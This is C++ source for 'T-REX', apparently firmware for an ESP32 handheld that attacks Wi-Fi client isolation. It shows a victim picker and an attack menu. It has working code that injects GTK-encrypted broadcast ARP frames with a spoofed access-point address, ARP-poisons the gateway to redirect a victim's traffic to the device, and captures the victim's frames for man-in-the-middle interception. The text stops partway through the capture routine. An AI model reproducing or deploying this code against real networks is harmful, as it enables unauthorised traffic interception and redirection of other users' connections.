// T-REX — offensive security firmware for LilyGo T-DECK
// SPDX-License-Identifier: AGPL-3.0-or-later
// Copyright (C) 2026 Abdallah Natsheh
//
// isoscan / is — ACTIVE client-isolation bypass attacks (AirSnitch Stage 2).
// See isoscan.h for the design; this file currently implements the VICTIM
// TARGETING layer (pick from the netspy list, confirm-before-fire, attack
// menu). The individual attack cores (GTK inject, port steal, RA DNS poison)
// are Stage-2 HW-gated work and are stubbed until each is built + verified.
//
// Technique reference (NO code used — reimplemented from published research):
//   AirSnitch, Mathy Vanhoef et al., NDSS 2026.
//   https://github.com/vanhoefm/airsnitch  (all-rights-reserved → techniques only)

#include "isoscan.h"
#include <Arduino.h>
#include <WiFi.h>
#include <string.h>
#include <strings.h>               // strcasecmp
#include <ctype.h>                 // isdigit
#include <stdlib.h>                // atoi, strtok
#include "esp_wifi.h"
#include "display_manager.h"
#include "input_handling.h"
#include "lockscreen_manager.h"
#include "netspy.h"                 // victim list: count / ip / mac / name; live GTK
#include "iso_ccmp.h"              // software CCMP encrypt + self-test
#include <lwip/etharp.h>           // read the victim's reply straight from our ARP cache
#include <lwip/netif.h>
#include <lwip/tcpip.h>            // LOCK_TCPIP_CORE
#include <lwip/udp.h>             // RA DNS poison: dual-stack (v4+v6) UDP-53 listener
#include <ESP32Ping.h>            // bounce: reach the victim via the gateway at IP layer
#include <SD.h>
#include "sdcard_manager.h"       // portdown capture → /apps/isoscan/NNN.pcap
#include "pcap_writer.h"          // libpcap writer (linktype 105)
#include "wifi_sd_guard.h"        // ScopedPromiscPause — GDMA-safe SD writes
#include <esp_netif.h>           // RA DNS poison: our link-local IPv6 for RDNSS

extern DisplayManager displayManager;
extern InputHandling  inputHandler;
extern SDCardManager  sdCardManager;

// ── attacks ────────────────────────────────────────────────────────────────────
enum IsoAttack {
    ISO_NONE = 0,
    ISO_INJECT,     // BUILT: GTK-encrypt a broadcast ARP → reachability probe
    ISO_BOUNCE,     // BUILT: reach the victim at IP layer via the gateway
    ISO_BCAST,      // note: not separately injectable (needs our PTK)
    ISO_PORTDOWN,   // BUILT: capture victim frames → SD pcap (non-disruptive)
    ISO_PORTUP,     // BUILT: gateway ARP-poison → redirect victim's uplink to us
    ISO_MITM,       // BUILT: combined gateway poison + victim capture (L2 MITM)
    ISO_RADNS,      // BUILT: ICMPv6 RA DNS poison + UDP-53 query logger
    ISO_AUTO        // BUILT: smart probe → detect L2/L3 → recommend attack
};

struct IsoAttackInfo { IsoAttack id; const char* key; const char* label; const char* desc; };
// Ordered easiest/most-reliable first. 'auto' is the recommended front door: it
// probes and tells you which attack fits this network. [exp] = works only on some
// networks (needs L2 client isolation / does not hold against a modern gateway).
static const IsoAttackInfo ISO_ATTACKS[] = {
    { ISO_AUTO,     "auto",     "Auto: probe + recommend", "Probe the target, detect L2/L3, recommend an attack" },
    { ISO_INJECT,   "inject",   "Inject GTK broadcast",    "GTK-encrypt broadcast ARP -> reach victim (proven)" },
    { ISO_BOUNCE,   "bounce",   "Reachability probe",      "Is the victim up? ARP-based, works vs firewall" },
    { ISO_PORTDOWN, "portdown", "Capture victim -> SD",    "Log the victim's frames to an /apps/isoscan pcap" },
    { ISO_MITM,     "mitm",     "MITM: poison + capture",  "ARP poison + capture; sustained-rate verdict [exp]" },
    { ISO_PORTUP,   "portup",   "Gateway poison [exp]",    "ARP-poison the victim's gateway toward us [exp]" },
    { ISO_RADNS,    "dns",      "RA DNS poison [exp]",     "ICMPv6 RA -> point victim DNS at us, log queries" },
    { ISO_BCAST,    "bcast",    "Broadcast (note only)",   "Not separately injectable - see inject/bounce" },
};
static const int ISO_ATTACK_N = (int)(sizeof(ISO_ATTACKS) / sizeof(ISO_ATTACKS[0]));

static IsoAttack isoAttackFromKey(const char* s) {
    for (int i = 0; i < ISO_ATTACK_N; i++)
        if (!strcasecmp(s, ISO_ATTACKS[i].key)) return ISO_ATTACKS[i].id;
    return ISO_NONE;
}
static const IsoAttackInfo* isoAttackInfo(IsoAttack a) {
    for (int i = 0; i < ISO_ATTACK_N; i++) if (ISO_ATTACKS[i].id == a) return &ISO_ATTACKS[i];
    return nullptr;
}

// ── header (RED accent — this command TRANSMITS) ────────────────────────────────
static void isoHeader(const char* tag) {
    auto& dm = displayManager;
    dm.clearScreen(); dm.updateStatusBar(); dm.setDefaultTextSize();
    dm.setCursor(6, outputY);
    dm.setTextColor(0x7BEF);     dm.printText("[");
    dm.setTextColor(TFT_RED);    dm.printText("ISO");
    dm.setTextColor(0x7BEF);     dm.printText("::");
    dm.setTextColor(TFT_YELLOW); dm.printText("SCAN");
    dm.setTextColor(0x7BEF);     dm.printText("]  "); dm.println(tag);
    dm.printSeparator();
}

static void isoIpStr(uint32_t ip, char* b, int n) {
    snprintf(b, n, "%u.%u.%u.%u", (unsigned)((ip >> 24) & 0xff), (unsigned)((ip >> 16) & 0xff),
             (unsigned)((ip >> 8) & 0xff), (unsigned)(ip & 0xff));
}
static void isoMacStr(const uint8_t* m, char* b, int n) {
    snprintf(b, n, "%02x:%02x:%02x:%02x:%02x:%02x", m[0], m[1], m[2], m[3], m[4], m[5]);
}

// ── victim picker (over the netspy device list) ─────────────────────────────────
#define ISO_ROWS 9
static void isoPickChrome() {
    auto& dm = displayManager;
    isoHeader("pick a victim");
    dm.setTextColor(0x7BEF);
    dm.setCursor(4,   outputY + LINE_HEIGHT * 2); dm.printText("#");
    dm.setCursor(26,  outputY + LINE_HEIGHT * 2); dm.printText("IP");
    dm.setCursor(122, outputY + LINE_HEIGHT * 2); dm.printText("NAME / VENDOR");
}
static void isoPickBody(int page, int sel) {
    auto& dm = displayManager;
    int devN = netspyDeviceCount();
    int rowTop = outputY + LINE_HEIGHT * 3;
    dm.fillRect(0, rowTop, SCREEN_WIDTH, 240 - rowTop, TFT_BLACK);   // rows + footer only
    int total = (devN + ISO_ROWS - 1) / ISO_ROWS; if (total < 1) total = 1;
    if (page >= total) page = total - 1;
    for (int r = 0; r < ISO_ROWS; r++) {
        int idx = page * ISO_ROWS + r;
        int y = rowTop + LINE_HEIGHT * r;
        if (idx >= devN) continue;
        bool s = (r == sel);
        if (s) dm.fillRect(0, y, SCREEN_WIDTH, LINE_HEIGHT, 0x0010);
        char nb[4]; snprintf(nb, sizeof(nb), "%d", idx);
        dm.setCursor(4, y); dm.setTextColor(s ? TFT_YELLOW : TFT_DARKGREY); dm.printText(nb);
        char ipb[16]; isoIpStr(netspyDeviceIp(idx), ipb, sizeof(ipb));
        dm.setCursor(26, y); dm.setTextColor(s ? TFT_YELLOW : TFT_WHITE); dm.printText(ipb);
        const char* who = netspyDeviceName(idx); if (!who) who = "?";
        char wb[20]; snprintf(wb, sizeof(wb), "%.18s", who);
        dm.setCursor(122, y); dm.setTextColor(s ? TFT_YELLOW : TFT_CYAN); dm.printText(wb);
    }
    char foot[64];
    snprintf(foot, sizeof(foot), "dev:%d pg%d/%d  trkbl=sel ent=pick a/l=page q", devN, page + 1, total);
    dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, 230); dm.printText(foot);
}

// Returns a netspy device index, or -1 if cancelled. Chrome once; rows redrawn
// only on page/selection change (no per-tick clearScreen = no flicker).
static int isoPickVictim() {
    auto& dm = displayManager;
    int page = 0, sel = 0, lastPage = -1, lastSel = -1;
    isoPickChrome();
    while (true) {
        char k = inputHandler.getKeyboardInput();
        TrackballEvent tb = inputHandler.getTrackballEvent();
        int devN = netspyDeviceCount();
        int total = (devN + ISO_ROWS - 1) / ISO_ROWS; if (total < 1) total = 1;
        int pageCount = devN - page * ISO_ROWS; if (pageCount > ISO_ROWS) pageCount = ISO_ROWS;

        if (k == 'q' || k == 'Q') return -1;
        else if (k == 'l' || k == 'L') { if (page < total - 1) { page++; sel = 0; } }
        else if (k == 'a' || k == 'A') { if (page > 0)         { page--; sel = 0; } }
        else if ((k == '\r' || k == '\n') && pageCount > 0) return page * ISO_ROWS + sel;
        else if (tb == TBALL_CLICK && pageCount > 0)        return page * ISO_ROWS + sel;
        else if (tb == TBALL_DOWN && sel < pageCount - 1) sel++;
        else if (tb == TBALL_UP   && sel > 0)             sel--;

        if (LockScreenManager::getInstance().consumeJustUnlocked()) { isoPickChrome(); lastPage = -1; lastSel = -1; }
        if (!dm.isBlocked() && (page != lastPage || sel != lastSel)) { isoPickBody(page, sel); lastPage = page; lastSel = sel; }
        vTaskDelay(pdMS_TO_TICKS(30));
    }
}

// ── attack menu (when no attack was given on the CLI) ────────────────────────────
// Chrome (header + target + footer) drawn ONCE; body redrawn only when the
// selection moves — no per-tick clearScreen, so no flicker. The selected attack's
// one-line description is shown so each tool explains itself.
static void isoMenuChrome(int idx) {
    auto& dm = displayManager;
    isoHeader("choose attack");
    const char* nm = netspyDeviceName(idx); if (!nm) nm = "?";
    dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, outputY + LINE_HEIGHT);  dm.printText("target:");
    dm.setTextColor(TFT_CYAN);     dm.setCursor(58, outputY + LINE_HEIGHT); dm.printText(nm);
    dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, 230);
    dm.printText("trkbl=move   ent=run   q=back");
}
static void isoMenuBody(int sel) {
    auto& dm = displayManager;
    int top = outputY + LINE_HEIGHT * 2;
    dm.fillRect(0, top, SCREEN_WIDTH, 226 - top, TFT_BLACK);   // list + desc region only
    for (int i = 0; i < ISO_ATTACK_N; i++) {
        int y = top + LINE_HEIGHT * i;
        bool s = (i == sel);
        if (s) dm.fillRect(0, y, SCREEN_WIDTH, LINE_HEIGHT, 0x0010);
        dm.setCursor(6, y);  dm.setTextColor(s ? TFT_YELLOW : 0x7BEF);    dm.printText(s ? ">" : " ");
        dm.setCursor(20, y); dm.setTextColor(s ? TFT_YELLOW : TFT_WHITE); dm.printText(ISO_ATTACKS[i].label);
        // CLI keyword — matches auto's verdict + `is ns# <keyword>`
        char kb[14]; snprintf(kb, sizeof(kb), "[%s]", ISO_ATTACKS[i].key);
        dm.setCursor(234, y); dm.setTextColor(s ? 0xFFE0 : 0x6FE8); dm.printText(kb);
    }
    dm.setTextColor(0x6FE8); dm.setCursor(6, top + LINE_HEIGHT * ISO_ATTACK_N + 5);
    dm.printText(ISO_ATTACKS[sel].desc);
}

// Returns the chosen attack, or ISO_NONE if cancelled.
static IsoAttack isoAttackMenu(int idx) {
    auto& dm = displayManager;
    int sel = 0, lastSel = -1;
    isoMenuChrome(idx);
    while (true) {
        char k = inputHandler.getKeyboardInput();
        TrackballEvent tb = inputHandler.getTrackballEvent();
        if (k == 'q' || k == 'Q') return ISO_NONE;
        if ((k == '\r' || k == '\n') || tb == TBALL_CLICK) return ISO_ATTACKS[sel].id;
        if (tb == TBALL_DOWN && sel < ISO_ATTACK_N - 1) sel++;
        if (tb == TBALL_UP   && sel > 0)                sel--;
        if (LockScreenManager::getInstance().consumeJustUnlocked()) { isoMenuChrome(idx); lastSel = -1; }
        if (!dm.isBlocked() && sel != lastSel) { isoMenuBody(sel); lastSel = sel; }
        vTaskDelay(pdMS_TO_TICKS(30));
    }
}

// ── confirm-before-fire ─────────────────────────────────────────────────────────
// isoscan TRANSMITS at the victim, so echo exactly who is about to be hit and
// require an explicit 'y'. A fat-fingered index must not attack the wrong device.
static bool isoConfirm(int idx, IsoAttack attack) {
    auto& dm = displayManager;
    uint8_t mac[6]; bool ok = netspyDeviceMac(idx, mac);
    const IsoAttackInfo* ai = isoAttackInfo(attack);
    auto draw = [&]() {
        if (dm.isBlocked()) return;
        isoHeader("CONFIRM ATTACK");
        int y = outputY + LINE_HEIGHT * 2;
        char b[48];
        dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, y);  dm.printText("attack");
        dm.setTextColor(TFT_YELLOW);   dm.setCursor(72, y); dm.printText(ai ? ai->label : "?");
        y += LINE_HEIGHT;
        dm.setTextColor(0x7BEF); dm.setCursor(72, y); dm.printText(ai ? ai->desc : ""); y += LINE_HEIGHT + 4;
        const char* nm = netspyDeviceName(idx); if (!nm) nm = "?";
        dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, y);  dm.printText("name");
        dm.setTextColor(TFT_CYAN);     dm.setCursor(72, y); dm.printText(nm); y += LINE_HEIGHT;
        isoIpStr(netspyDeviceIp(idx), b, sizeof(b));
        dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, y);  dm.printText("IP");
        dm.setTextColor(TFT_WHITE);    dm.setCursor(72, y); dm.printText(b); y += LINE_HEIGHT;
        isoMacStr(mac, b, sizeof(b));
        dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, y);  dm.printText("MAC");
        dm.setTextColor(TFT_WHITE);    dm.setCursor(72, y); dm.printText(b); y += LINE_HEIGHT + 6;
        dm.setTextColor(TFT_RED);      dm.setCursor(6, y);
        dm.printText("This TRANSMITS at the target.");
        dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, 230);
        dm.printText("[y] fire   [n]/[q] cancel");
    };
    if (!ok) return false;
    draw();
    while (true) {
        char k = inputHandler.getKeyboardInput();
        if (k == 'y' || k == 'Y') return true;
        if (k == 'n' || k == 'N' || k == 'q' || k == 'Q') return false;
        if (LockScreenManager::getInstance().consumeJustUnlocked()) draw();
        vTaskDelay(pdMS_TO_TICKS(30));
    }
}

// ── inject transmit primitive (shared by all GTK-inject payloads) ───────────────
// Build a broadcast FromDS data header: Data + FromDS + Protected; A1 = broadcast,
// A2 = BSSID (spoof the AP), A3 = source. seq goes in SeqCtrl (masked out of AAD).
static void isoBuildHdr(const uint8_t bssid[6], const uint8_t src[6], uint16_t seq, uint8_t hdr[24]) {
    hdr[0] = 0x08; hdr[1] = 0x42;                    // Data, FromDS, Protected
    hdr[2] = 0x00; hdr[3] = 0x00;                    // duration
    memset(hdr + 4, 0xff, 6);                        // A1 = broadcast
    memcpy(hdr + 10, bssid, 6);                      // A2 = BSSID (spoofed)
    memcpy(hdr + 16, src, 6);                        // A3 = original source
    uint16_t sc = (uint16_t)((seq & 0x0fff) << 4);   // seq number, fragment 0
    hdr[22] = (uint8_t)(sc & 0xff); hdr[23] = (uint8_t)(sc >> 8);
}

// LLC/SNAP + ARP request ("who-has victimIp, tell srcIp/srcMac"). Returns length.
static int isoBuildArp(const uint8_t srcMac[6], uint32_t srcIp, uint32_t dstIp, uint8_t* p) {
    static const uint8_t snap[8] = { 0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x08, 0x06 };
    memcpy(p, snap, 8);
    uint8_t* a = p + 8;
    a[0] = 0x00; a[1] = 0x01;                         // HW type: Ethernet
    a[2] = 0x08; a[3] = 0x00;                         // proto: IPv4
    a[4] = 0x06; a[5] = 0x04;                         // hlen 6, plen 4
    a[6] = 0x00; a[7] = 0x01;                         // opcode: request
    memcpy(a + 8, srcMac, 6);                         // sender MAC
    a[14] = (srcIp >> 24) & 0xff; a[15] = (srcIp >> 16) & 0xff;
    a[16] = (srcIp >> 8) & 0xff;  a[17] = srcIp & 0xff;
    memset(a + 18, 0x00, 6);                          // target MAC unknown
    a[24] = (dstIp >> 24) & 0xff; a[25] = (dstIp >> 16) & 0xff;
    a[26] = (dstIp >> 8) & 0xff;  a[27] = dstIp & 0xff;
    return 8 + 28;
}

// One GTK-encrypted broadcast ARP on the air. Shared by every inject payload
// (reachability inject, gateway poison, combined MITM) — the encrypt+assemble+TX
// dance is identical; only the sender IP (our IP vs the gateway IP we impersonate)
// changes. Returns the esp_wifi_80211_tx result (ESP_OK on success).
static esp_err_t isoTxGtkArp(const uint8_t gtk[16], const uint8_t bssid[6], const uint8_t src[6],
                             uint8_t keyid, uint64_t pn, uint16_t seq,
                             uint32_t senderIp, uint32_t targetIp) {
    uint8_t pnb[6]; for (int i = 0; i < 6; i++) pnb[i] = (uint8_t)((pn >> (8 * i)) & 0xff);
    uint8_t hdr[24]; isoBuildHdr(bssid, src, seq, hdr);
    uint8_t plain[64]; int plen = isoBuildArp(src, senderIp, targetIp, plain);
    uint8_t enc[96];
    int elen = isoCcmpEncrypt(gtk, 16, hdr, keyid, pnb, plain, plen, enc, sizeof(enc));
    if (elen <= 0) return ESP_FAIL;
    uint8_t frame[128]; memcpy(frame, hdr, 24); memcpy(frame + 24, enc, elen);
    return esp_wifi_80211_tx(WIFI_IF_STA, frame, 24 + elen, false);
}

// Note: no promiscuous RX here. The victim's ARP reply is UNICAST to us, so it
// flows through the normal STA data path into lwip (not the promiscuous cb, which
// only gets group frames decrypted). We detect it by reading our own ARP cache —
// and enabling promiscuous would risk diverting that reply away from lwip.

// First real inject: GTK-encrypted broadcast ARP at the victim (plan "inject arp",
// reachability probe). Also the diagnostic for the big unknown — will
// esp_wifi_80211_tx accept a frame whose A2 is the spoofed BSSID while we're
// associated? The live TX ok/err counters answer that on the first flash.
static bool isoInjectArp(int idx) {
    auto& dm = displayManager;
    uint8_t gtk[32]; int glen = 0;
    if (!netspyGetGtk(gtk, &glen) || glen != 16) {
        isoHeader("inject");
        dm.setTextColor(TFT_RED); dm.println("GTK unreadable — abort.");
        dm.setTextColor(0x7BEF);  dm.println("(run 'is cctest' to check)");
        dm.printCommandScreen(); return false;
    }
    const uint8_t* bm = WiFi.BSSID();
    if (!bm) { isoHeader("inject"); dm.setTextColor(TFT_RED); dm.println("No BSSID."); dm.printCommandScreen(); return false; }
    uint8_t bssid[6]; memcpy(bssid, bm, 6);
    uint8_t src[6];   esp_wifi_get_mac(WIFI_IF_STA, src);
    IPAddress lip = WiFi.localIP();
    uint32_t myIp = ((uint32_t)lip[0] << 24) | ((uint32_t)lip[1] << 16) | ((uint32_t)lip[2] << 8) | lip[3];
    uint32_t victimIp = netspyDeviceIp(idx);

    uint64_t pn = 0x800000000000ULL;                 // start high to beat AP group PN
    uint8_t  keyid = 1;                              // GTK key id — tunable ([k] toggles 1/2)
    uint16_t seq = 0;
    uint32_t txOk = 0, txErr = 0;
    uint32_t lastTx = 0, lastVal = 0, lastArp = 0;
    esp_err_t lastRc = ESP_OK;
    bool arpHit = false; uint8_t arpMac[6] = { 0 };  // victim reply seen in OUR ARP cache

    // Fixed rows so only the values that change get repainted (no full-body clear
    // = no flicker; same in-place approach as portdown/radns).
    const int yWhat = outputY + LINE_HEIGHT * 2, yTgt = outputY + LINE_HEIGHT * 3;
    const int yIp = outputY + LINE_HEIGHT * 4, yKey = outputY + LINE_HEIGHT * 6;
    const int yOk = outputY + LINE_HEIGHT * 7, yErr = outputY + LINE_HEIGHT * 8;
    const int yRes = outputY + LINE_HEIGHT * 10;

    auto chrome = [&]() {                             // static parts — drawn once
        if (dm.isBlocked()) return;
        isoHeader("inject: ARP (GTK)");
        const char* nm = netspyDeviceName(idx); if (!nm) nm = "?";
        char b[48];
        dm.setTextColor(0x6FE8);       dm.setCursor(6, yWhat); dm.printText("send encrypted ARP; wait for a reply");
        dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, yTgt);  dm.printText("target");
        dm.setTextColor(TFT_CYAN);     dm.setCursor(72, yTgt); dm.printText(nm);
        isoIpStr(victimIp, b, sizeof(b));
        dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, yIp);   dm.printText("ip");
        dm.setTextColor(TFT_WHITE);    dm.setCursor(72, yIp);  dm.printText(b);
        dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, yKey);  dm.printText("keyid");
        dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, yOk);   dm.printText("TX ok");
        dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, yErr);  dm.printText("TX err");
        dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, 230);   dm.printText("[k] keyid 1/2   [q] back to menu");
    };
    auto val = [&](int y, uint16_t col, const char* s) {   // repaint one value cell in place
        dm.fillRect(66, y, SCREEN_WIDTH - 66, LINE_HEIGHT, TFT_BLACK);
        dm.setTextColor(col); dm.setCursor(72, y); dm.printText(s);
    };
    auto values = [&]() {
        if (dm.isBlocked()) return;
        char b[48];
        snprintf(b, sizeof(b), "%u", keyid);                val(yKey, TFT_YELLOW, b);
        snprintf(b, sizeof(b), "%lu", (unsigned long)txOk); val(yOk,  TFT_GREEN,  b);
        snprintf(b, sizeof(b), "%lu (rc=%d)", (unsigned long)txErr, (int)lastRc);
        val(yErr, txErr ? TFT_RED : TFT_DARKGREY, b);
        dm.fillRect(0, yRes, SCREEN_WIDTH, LINE_HEIGHT, TFT_BLACK);
        if (arpHit) {
            snprintf(b, sizeof(b), "REACHED  %02x:%02x:%02x:%02x:%02x:%02x",
                     arpMac[0], arpMac[1], arpMac[2], arpMac[3], arpMac[4], arpMac[5]);
            dm.setTextColor(TFT_GREEN); dm.setCursor(6, yRes); dm.printText(b);
        } else {
            dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, yRes); dm.printText("waiting for the victim to reply...");
        }
    };
    chrome(); values();

    while (true) {
        char k = inputHandler.getKeyboardInput();
        if (k == 'q' || k == 'Q') break;
        if (k == 'k' || k == 'K') { keyid = (keyid == 1) ? 2 : 1; if (!dm.isBlocked()) values(); }

        if (millis() - lastTx >= 20) {                 // ~50 fps (enough to hold a poison on an L2 AP)
            lastTx = millis();
            lastRc = isoTxGtkArp(gtk, bssid, src, keyid, pn, seq++, myIp, victimIp);
            if (lastRc == ESP_OK) txOk++; else txErr++;
            pn++;
        }

        // Resolve the victim via our own IP stack (netdiscover's proven pattern:
        // etharp_request primes a pending entry, then etharp_find_addr reads it
        // once a reply completes it). A hit = the victim is reachable at the IP layer.
        if (!arpHit && netif_default && millis() - lastArp >= 500) {
            lastArp = millis();
            ip4_addr_t vt;
            IP4_ADDR(&vt, (victimIp >> 24) & 0xff, (victimIp >> 16) & 0xff,
                     (victimIp >> 8) & 0xff, victimIp & 0xff);
            struct eth_addr* er = nullptr; const ip4_addr_t* ir = nullptr;
            LOCK_TCPIP_CORE();
            etharp_request(netif_default, &vt);
            s8_t hit = etharp_find_addr(netif_default, &vt, &er, &ir);
            UNLOCK_TCPIP_CORE();
            if (hit >= 0 && er) { arpHit = true; memcpy(arpMac, er->addr, 6); if (!dm.isBlocked()) values(); }
        }

        if (LockScreenManager::getInstance().consumeJustUnlocked()) { chrome(); values(); }
        if (!dm.isBlocked() && millis() - lastVal >= 500) { values(); lastVal = millis(); }
        vTaskDelay(pdMS_TO_TICKS(5));
    }
    dm.clearScreen(); return true;
}

// ── gateway ARP-poison (uplink MITM + isolation-delivery test) ───────────────────
// Inject a sustained GTK-encrypted ARP advertising the GATEWAY's IP as coming from
// our MAC ("who-has victim tell gateway<-ourMAC"): the victim caches gateway->us and
// starts sending its upstream traffic to the T-Deck. On this isolated hotspot this
// is also THE delivery test — if the victim's internet redirects/stalls, then
// victim->T-Deck delivery works and traffic-interception attacks (RA DNS poison,
// MITM) are viable; if the victim keeps browsing normally, isolation is dropping it.
static bool isoGwPoison(int idx) {
    auto& dm = displayManager;
    uint8_t gtk[32]; int glen = 0;
    if (!netspyGetGtk(gtk, &glen) || glen != 16) {
        isoHeader("gw poison");
        dm.setTextColor(TFT_RED); dm.println("GTK unreadable — abort."); dm.printCommandScreen(); return false;
    }
    const uint8_t* bm = WiFi.BSSID();
    if (!bm) { isoHeader("gw poison"); dm.setTextColor(TFT_RED); dm.println("No BSSID."); dm.printCommandScreen(); return false; }
    uint8_t bssid[6]; memcpy(bssid, bm, 6);
    uint8_t src[6];   esp_wifi_get_mac(WIFI_IF_STA, src);
    IPAddress gw = WiFi.gatewayIP();
    uint32_t gwIp = ((uint32_t)gw[0] << 24) | ((uint32_t)gw[1] << 16) | ((uint32_t)gw[2] << 8) | gw[3];
    uint32_t victimIp = netspyDeviceIp(idx);
    if (!gwIp) { isoHeader("gw poison"); dm.setTextColor(TFT_RED); dm.println("No gateway IP."); dm.printCommandScreen(); return false; }

    uint64_t pn = 0x800000000000ULL; uint8_t keyid = 1; uint16_t seq = 0;
    uint32_t txOk = 0, txErr = 0, lastTx = 0, lastVal = 0; esp_err_t lastRc = ESP_OK;

    const int yWhat = outputY + LINE_HEIGHT * 2, yGw = outputY + LINE_HEIGHT * 3;
    const int yVic = outputY + LINE_HEIGHT * 4, yTx = outputY + LINE_HEIGHT * 6;
    const int yErr = outputY + LINE_HEIGHT * 7, yHint = outputY + LINE_HEIGHT * 9;

    auto chrome = [&]() {                             // static parts — drawn once
        if (dm.isBlocked()) return;
        isoHeader("gateway poison");
        char b[48];
        dm.setTextColor(0x6FE8);       dm.setCursor(6, yWhat); dm.printText("tell victim WE are its gateway");
        isoIpStr(gwIp, b, sizeof(b));
        dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, yGw);  dm.printText("gateway");
        dm.setTextColor(TFT_YELLOW);   dm.setCursor(72, yGw); dm.printText(b);
        isoIpStr(victimIp, b, sizeof(b));
        dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, yVic);  dm.printText("victim");
        dm.setTextColor(TFT_CYAN);     dm.setCursor(72, yVic); dm.printText(b);
        dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, yTx);  dm.printText("TX ok");
        dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, yErr); dm.printText("TX err");
        dm.setTextColor(0x7BEF);       dm.setCursor(6, yHint); dm.printText("watch victim net: stalls = holding");
        dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, 230);  dm.printText("[k] keyid 1/2   [q] back to menu");
    };
    auto values = [&]() {                             // repaint only the counters, in place
        if (dm.isBlocked()) return;
        char b[48];
        snprintf(b, sizeof(b), "%lu   (keyid %u)", (unsigned long)txOk, keyid);
        dm.fillRect(66, yTx, SCREEN_WIDTH - 66, LINE_HEIGHT, TFT_BLACK);
        dm.setTextColor(TFT_GREEN); dm.setCursor(72, yTx); dm.printText(b);
        snprintf(b, sizeof(b), "%lu (rc=%d)", (unsigned long)txErr, (int)lastRc);
        dm.fillRect(66, yErr, SCREEN_WIDTH - 66, LINE_HEIGHT, TFT_BLACK);
        dm.setTextColor(txErr ? TFT_RED : TFT_DARKGREY); dm.setCursor(72, yErr); dm.printText(b);
    };
    chrome(); values();
    while (true) {
        char k = inputHandler.getKeyboardInput();
        if (k == 'q' || k == 'Q') break;
        if (k == 'k' || k == 'K') { keyid = (keyid == 1) ? 2 : 1; if (!dm.isBlocked()) values(); }
        if (millis() - lastTx >= 20) {                 // ~50 fps (enough to hold a poison on an L2 AP)
            lastTx = millis();
            lastRc = isoTxGtkArp(gtk, bssid, src, keyid, pn, seq++, gwIp, victimIp);  // sender IP = gateway
            if (lastRc == ESP_OK) txOk++; else txErr++;
            pn++;
        }
        if (LockScreenManager::getInstance().consumeJustUnlocked()) { chrome(); values(); }
        if (!dm.isBlocked() && millis() - lastVal >= 500) { values(); lastVal = millis(); }
        vTaskDelay(pdMS_TO_TICKS(5));
    }
    dm.clearScreen(); return true;
}

// portdown capture ring — promiscuous grabs every 802.11 data frame that mentions
// the victim MAC (A1/A2/A3) into a RAM ring; the main loop drains it to an SD pcap
// with promiscuous paused (GDMA rule). Non-disruptive: no MAC change, we stay
// associated. Captures the group traffic + anything a poison redirects our way.
#define ISO_CAP_RING 16
#define ISO_CAP_MAX  288
struct IsoCapFrame { uint16_t len; uint32_t ts; uint8_t data[ISO_CAP_MAX]; };
static volatile IsoCapFrame s_capRing[ISO_CAP_RING];
static volatile uint8_t     s_capHead = 0, s_capTail = 0;
static volatile uint8_t     s_capVic[6];
static volatile uint8_t     s_capOur[6];             // our STA MAC — for redirect detection
static volatile bool        s_capActive = false;
static volatile bool        s_capRedirOn = false;    // classify redirected victim uplink (MITM proof)
static volatile uint32_t    s_capSeen = 0, s_capDropped = 0;
static volatile uint32_t    s_capRedir = 0;          // victim IP DATA relayed to us = REAL MITM
static volatile uint32_t    s_capArpAck = 0;         // victim ARP reply to our poison = reacted only
static volatile uint32_t    s_capCand = 0;           // raw addr-match (A1=us,A3=victim) before classify

static void isoCapCb(void* buf, wifi_promiscuous_pkt_type_t t) {
    if (!s_capActive || t != WIFI_PKT_DATA) return;
    wifi_promiscuous_pkt_t* pk = (wifi_promiscuous_pkt_t*)buf;
    int len = pk->rx_ctrl.sig_len;
    if (len < 24 || len > 2000) return;
    const uint8_t* f = pk->payload;
    if (memcmp(f + 4,  (const void*)s_capVic, 6) != 0 &&     // A1 dest
        memcmp(f + 10, (const void*)s_capVic, 6) != 0 &&     // A2
        memcmp(f + 16, (const void*)s_capVic, 6) != 0) return; // A3
    s_capSeen++;
    // Redirect signal: a from-DS frame the AP relayed to US (A1=our MAC) whose
    // original source is the victim (A3=victim). This matches TWO different frames
    // and only ONE is real MITM proof, so classify by ethertype:
    //   ARP (0x0806) → the victim just ACKing our poison (reacted, not redirected)
    //   IP  (0x0800/0x86dd) → the victim's actual uplink DATA arriving = REAL MITM.
    // Counting the ARP reply as "MITM live" is a false positive (seen on HW: green
    // yet the victim kept full internet). Payload is decrypted for frames addressed
    // to us; CCMP header (8B) is kept, so LLC/SNAP starts at hdrlen+8.
    if (s_capRedirOn && (f[1] & 0x03) == 0x02 &&             // from-DS only
        memcmp(f + 4,  (const void*)s_capOur, 6) == 0 &&     // A1 = us
        memcmp(f + 16, (const void*)s_capVic, 6) == 0) {     // A3 = victim
        s_capCand++;                                         // raw match (payload not yet read)
        int hl = ((f[0] & 0x8C) == 0x88) ? 26 : 24;          // QoS data → +2
        int eo = hl + 8 + 6;                                 // +CCMP(8) +SNAP(6) = ethertype
        if (eo + 1 < len) {
            uint16_t et = (uint16_t)((f[eo] << 8) | f[eo + 1]);
            if (et == 0x0806)                       s_capArpAck++;   // poison ACK only
            else if (et == 0x0800 || et == 0x86DD)  s_capRedir++;    // real data redirect
        }
    }
    uint8_t nx = (uint8_t)((s_capHead + 1) % ISO_CAP_RING);
    if (nx == s_capTail) { s_capDropped++; return; }
    int n = len > ISO_CAP_MAX ? ISO_CAP_MAX : len;
